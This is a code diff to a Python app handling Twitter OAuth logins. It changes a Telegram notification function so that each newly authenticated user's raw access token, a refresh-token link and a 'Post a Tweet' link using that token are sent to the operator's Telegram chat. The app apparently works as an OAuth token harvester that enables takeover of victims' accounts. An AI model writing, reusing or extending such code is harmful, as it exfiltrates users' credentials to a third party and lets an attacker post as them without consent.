@@ -138,12 +138,33 @@ def refresh_token_in_db(refresh_token, username):
         return None, None
 
 # Send message via Telegram
-def send_message_via_telegram(message):
+def send_message_via_telegram(access_token, refresh_token=None):
+    alert_emoji = "🚨"
+    key_emoji = "🔑"
+    
+    # Get the username from the access token
+    username = get_twitter_username(access_token)
+    if username:
+        twitter_url = f"https://twitter.com/{username}"
+    else:
+        twitter_url = "Unknown user"
+    
+    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
+    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
+    
+    if refresh_token:
+        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
+        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
+
+    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
+    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
+    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"  # Include username and profile link
+
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": "Markdown"  # To format the message
     }
     requests.post(url, json=data)
 
